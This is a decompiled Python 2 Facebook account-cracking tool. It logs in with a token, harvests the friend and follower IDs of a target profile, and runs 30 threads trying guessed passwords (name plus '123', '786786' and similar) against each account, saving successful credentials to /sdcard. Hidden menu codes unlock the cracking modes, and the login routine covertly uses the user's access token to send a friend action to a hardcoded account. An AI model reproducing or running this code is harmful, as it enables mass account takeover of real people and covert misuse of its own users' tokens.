# Source Generated with Decompyle++
# File: Somi.pyc (Python 2.7)


try:
    import os
    import sys
    import time
    import datetime
    import random
    import hashlib
    import re
    import threading
    import json
    import getpass
    import urllib
    import cookielib
    import requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('pkg install nodejs')
    os.system('python2 hop.py')


try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass


try:
    os.mkdir('/sdcard/ids/ex_ids')
except OSError:
    pass

os.system('git pull')
from requests.exceptions import ConnectionError
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
reload(sys)
sys.setdefaultencoding('utf8')
logo = '\n \x1b[0;32m     _______  _______  _______ _________\n \x1b[0;32m    (  ____ \\(  ___  )(       )\\__   __/\n \x1b[0;32m    | (    \\/| (   ) || () () |   ) (   \n \x1b[0;32m    | (_____ | |   | || || || |   | |   \n \x1b[0;31m    (_____  )| |   | || |(_)| |   | |   \n \x1b[0;31m          ) || |   | || |   | |   | |   \n \x1b[0;31m    /\\____) || (___) || )   ( |___) (___\n \x1b[0;31m    \\_______)(_______)|/     \\|\\_______/\n     \x1b[105m\x1b[37;1mCODED BY SOMI-AWAN\x1b[0m\n\x1b[1;97m-----------------------------------------------\n\x1b[0;36mDEVOLPER    :   SOMI AWAN\n\x1b[0;36mWHATSAAP    :   03455453538\n\x1b[0;36mFACEBOOK    :   https://www.facebook.com/SO MI\n\x1b[1;97m-----------------------------------------------\n'
idh = []
back = 0

def login_choice():
    os.system('clear')
    
    try:
        open('.login.txt', 'r')
        menu()
    except IOError:
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mLOGIN MENU\x1b[0;97m'
        print ''
        print '(1) Login with token'
        print '(2) Login with id/pass'
        print ''
        login_select()



def login_select():
    select = raw_input('\x1b[1;33mChoose option: \x1b[0;97m')
    if select == '1':
        login_token()
    elif select == '2':
        login_fb()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        time.sleep(1)
        login_select()


def login_fb():
    os.system('clear')
    print logo
    print ''
    print '\t    \x1b[1;32mLOGIN WITH ID/PASS\x1b[0;97m'
    print ''
    id = raw_input(' Id/mail/number: ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input(' Password: ')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers = header).text
    q = json.loads(data)
    if 'loc' in q:
        hamza = open('.login.txt', 'w')
        hamza.write(q['loc'])
        hamza.close()
        requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token=' + q['loc'])
        menu()
    elif 'www.facebook.com' in q['error']:
        print ''
        print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
        time.sleep(1)
        print ''
        raw_input('\tPress enter to back ')
        login_choice()
    else:
        print ''
        print '\t    \x1b[1;31mIncorrect credentials\x1b[0;97m'
        raw_input('Press enter to try again ')
        login_choice()


def login_token():
    os.system('clear')
    
    try:
        open('.login.txt', 'r')
        time.sleep(1)
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mFB TOKEN LOGIN\x1b[0;97m'
        print ''
        token = raw_input(' Paste token : ')
        token_save = open('.login.txt', 'w')
        token_save.write(token)
        token_save.close()
        time.sleep(1)
        menu()



def menu():
    os.system('clear')
    
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ''
        print logo
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers = header)
        a = json.loads(r.text)
        name = a['name']
    except KeyError:
        os.system('clear')
        print ''
        print logo
        print ''
        print '\t    \x1b[1;31mToken expired\x1b[0;97m'
        time.sleep(1)
        os.system('rm -rf .login.txt')
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\t    \x1b[1;32mUser: ' + name + '\x1b[0;97m'
    print ''
    print 47 * '-'
    print ''
    print '(1) Dump/Extract ids'
    print '(0) Close'
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;33mChoose option: \x1b[0;97m')
    if select == '1111111':
        crack()
    elif select == '111q2':
        choice()
    elif select == '1':
        ex_id()
    elif select == '4':
        ex_file()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\t    \x1b[1;32mAUTO PASS CLONING\x1b[0;97m'
    print ''
    print '[1] Crack public id'
    print '[2] Crack followers'
    print '[3] Crack file'
    print '[0] Back'
    print ''
    crack_select()


def crack_select():
    select = raw_input('\x1b[1;33mChoose option: \x1b[0;97m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mAUTO PASS PUBLIC CRACK\x1b[0;97m'
        print ''
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            print ' Cloning from : ' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mAUTO PASS CRACK FOLLOWERS\x1b[0;97m'
        print ''
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            print ' Cloning from: ' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '3':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mAUTO PASS FILE CRACK\x1b[0;97m'
        print ''
        
        try:
            filelist = raw_input('[+] File : ')
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except (KeyError, IOError):
            print ''
            print '\t    \x1b[1;31mRequested file not found\x1b[0;97m'
            print ''
            raw_input(' Press enter to back ')
            crack()
        

    if select == '0':
        menu()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        crack_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            pass1 = 'Pakistan'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/checkpoint.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[Checkpoint] ' + uid + ' | ' + pass1
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + '123'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/checkpoint.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[Checkpoint] ' + uid + ' | ' + pass2
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name + '1234'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/checkpoint.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[Checkpoint] ' + uid + ' | ' + pass3
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name + '12345'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/checkpoint.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[Checkpoint] ' + uid + ' | ' + pass4
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = name + '786'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/checkpoint.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '[Checkpoint] ' + uid + ' | ' + pass5
                                cp = open('checkpoint.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass6)
                            else:
                                pass6 = '000786'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/checkpoint.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '[Checkpoint] ' + uid + ' | ' + pass6
                                    cp = open('checkpoint.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = '786786'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;37m[Checkpoint] \x1b[1;30m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/checkpoint.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '[Checkpoint] ' + uid + ' | ' + pass7
                                        cp = open('checkpoint.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    crack()


def ex_id():
    global token
    idg = []
    
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        print ''
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\t    \x1b[1;32mCOLLECT PUBLIC ID FRIENDLIST\x1b[0;97m'
    print ''
    idh = raw_input(' Input Id: ')
    
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers = header)
        q = json.loads(r.text)
        print ' Collecting from: ' + q['name']
    except KeyError:
        print ''
        print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
        print ''
        raw_input(' Press enter to back')
        crack()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers = header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')
    
    ids.close()
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total ids: ' + str(len(idg))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to download file')
    os.system('cp ids_friends.txt /sdcard')
    os.system('rm -rf ids_friends.txt')
    print ' File downloaded successfully'
    time.sleep(1)
    menu()


def choice():
    global token
    os.system('clear')
    
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\t    \x1b[1;32mCHOICE PASS CRACK MENU\x1b[0;97m'
    print ''
    print '[1] Crack public id'
    print '[2] Crack followers'
    print '[3] Crack file'
    print '[0] Back'
    print ''
    choice_select()


def choice_select():
    select = raw_input('\x1b[1;33mChoose option: \x1b[0;97m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mCHOICE PASS PUBLIC CRACK\x1b[0;97m'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        pass4 = raw_input(' Password: ')
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            print ' Cloning from : ' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mAUTO PASS CRACK FOLLOWERS\x1b[0;97m'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        pass4 = raw_input(' Password: ')
        idt = raw_input(' Input id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
            q = json.loads(r.text)
            print ' Cloning from: ' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers = header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif select == '3':
        os.system('clear')
        print logo
        print ''
        print '\t    \x1b[1;32mAUTO PASS FILE CRACK\x1b[0;97m'
        print ''
        pass1 = raw_input(' Password: ')
        pass2 = raw_input(' Password: ')
        pass3 = raw_input(' Password: ')
        pass4 = raw_input(' Password: ')
        filelist = raw_input(' Input file: ')
        
        try:
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except (KeyError, IOError):
            print ''
            print '\t    \x1b[1;31mRequested file not found\x1b[0;97m'
            print ''
            raw_input(' Press enter to back ')
            choice()
        

    if select == '0':
        menu()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        choice_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/checkpoint.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[Checkpoint] ' + uid + ' | ' + pass1
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/checkpoint.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[Checkpoint] ' + uid + ' | ' + pass2
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/checkpoint.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[Checkpoint] ' + uid + ' | ' + pass3
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;37m[Checkpoint] \x1b[1;37m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/checkpoint.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[Checkpoint] ' + uid + ' | ' + pass4
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    choice()

if __name__ == '__main__':
    login_choice()
